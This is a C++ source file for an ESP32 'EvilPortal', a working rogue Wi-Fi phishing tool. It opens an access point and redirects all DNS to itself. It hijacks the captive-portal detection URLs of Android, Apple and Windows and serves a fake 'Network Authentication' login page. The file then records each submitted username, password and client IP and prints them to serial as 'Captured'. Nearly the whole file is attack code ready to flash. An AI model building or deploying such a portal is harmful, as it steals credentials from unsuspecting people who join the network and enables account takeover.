#include "EvilPortal.h"

EvilPortal* EvilPortal::_instance = nullptr;

static const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#16213e;border-radius:12px;padding:40px;width:340px;box-shadow:0 8px 32px rgba(0,0,0,.4)}
h2{text-align:center;margin-bottom:8px;font-size:20px}
p{text-align:center;color:#888;font-size:13px;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:16px;border:1px solid #333;border-radius:8px;background:#0f1729;color:#fff;font-size:14px}
input:focus{outline:none;border-color:#4361ee}
button{width:100%;padding:12px;border:none;border-radius:8px;background:#4361ee;color:#fff;font-size:16px;cursor:pointer;font-weight:600}
button:hover{background:#3a56d4}
.logo{text-align:center;font-size:32px;margin-bottom:16px}
</style>
</head>
<body>
<div class="card">
<div class="logo">&#128274;</div>
<h2>Network Authentication</h2>
<p>Sign in to access the internet</p>
<form action="/login" method="POST">
<input type="text" name="user" placeholder="Email or Username" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
</div>
</body>
</html>
)rawliteral";

static const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
body{font-family:sans-serif;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#16213e;border-radius:12px;padding:40px;width:340px;text-align:center}
h2{color:#4cc9f0;margin-bottom:16px}
</style>
</head>
<body>
<div class="card">
<h2>&#10004; Connected</h2>
<p>You are now connected to the internet.</p>
</div>
</body>
</html>
)rawliteral";

EvilPortal::EvilPortal()
    : _server(nullptr)
    , _dns(nullptr)
    , _running(false)
    , _mutex(nullptr)
    , _clientCount(0) {
    _instance = this;
}

EvilPortal::~EvilPortal() {
    stop();
}

void EvilPortal::begin(const String& ssid) {
    if (_running) stop();

    _mutex = xSemaphoreCreateMutex();
    _portalSSID = ssid;

    WiFi.mode(WIFI_AP);
    WiFi.softAP(_portalSSID.c_str());
    delay(100);

    IPAddress apIP(192, 168, 4, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

    _dns = new DNSServer();
    _dns->start(53, "*", apIP);

    _server = new WebServer(80);
    _server->on("/", HTTP_GET, handleRoot);
    _server->on("/login", HTTP_POST, handleLogin);
    _server->on("/generate_204", HTTP_GET, handleRoot);  // Android
    _server->on("/hotspot-detect.html", HTTP_GET, handleRoot);  // Apple
    _server->on("/connecttest.txt", HTTP_GET, handleRoot);  // Windows
    _server->onNotFound(handleNotFound);
    _server->begin();

    _running = true;
}

void EvilPortal::stop() {
    if (_server) {
        _server->stop();
        delete _server;
        _server = nullptr;
    }
    if (_dns) {
        _dns->stop();
        delete _dns;
        _dns = nullptr;
    }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    _running = false;
}

void EvilPortal::update() {
    if (!_running) return;
    if (_dns) _dns->processNextRequest();
    if (_server) _server->handleClient();
    _clientCount = WiFi.softAPgetStationNum();
}

void EvilPortal::start() { begin(); }
void EvilPortal::handleClient() { update(); }

void EvilPortal::handleRoot() {
    if (!_instance || !_instance->_server) return;
    _instance->_server->send_P(200, "text/html", PORTAL_HTML);
}

void EvilPortal::handleLogin() {
    if (!_instance || !_instance->_server) return;

    String user = _instance->_server->arg("user");
    String pass = _instance->_server->arg("pass");
    String ip = _instance->_server->client().remoteIP().toString();

    if (user.length() > 0) {
        CapturedCred cred;
        cred.username = user;
        cred.password = pass;
        cred.ip = ip;
        cred.timestamp = millis();

        if (_instance->_mutex) xSemaphoreTake(_instance->_mutex, portMAX_DELAY);
        _instance->_captured.add(cred);
        if (_instance->_mutex) xSemaphoreGive(_instance->_mutex);

        Serial.printf("[PORTAL] Captured: %s / %s from %s\n",
                      user.c_str(), pass.c_str(), ip.c_str());
    }

    _instance->_server->send_P(200, "text/html", SUCCESS_HTML);
}

void EvilPortal::handleNotFound() {
    if (!_instance || !_instance->_server) return;
    _instance->_server->sendHeader("Location", "http://192.168.4.1/", true);
    _instance->_server->send(302, "text/plain", "");
}

int EvilPortal::getCapturedCount() {
    if (!_mutex) return 0;
    xSemaphoreTake(_mutex, portMAX_DELAY);
    int c = _captured.size();
    xSemaphoreGive(_mutex);
    return c;
}

CapturedCred EvilPortal::getCapturedCred(int index) {
    CapturedCred cred;
    if (!_mutex) return cred;
    xSemaphoreTake(_mutex, portMAX_DELAY);
    if (index >= 0 && index < _captured.size()) {
        cred = _captured.get(index);
    }
    xSemaphoreGive(_mutex);
    return cred;
}

void EvilPortal::clearCaptured() {
    if (!_mutex) return;
    xSemaphoreTake(_mutex, portMAX_DELAY);
    while (_captured.size() > 0) _captured.remove(0);
    xSemaphoreGive(_mutex);
}
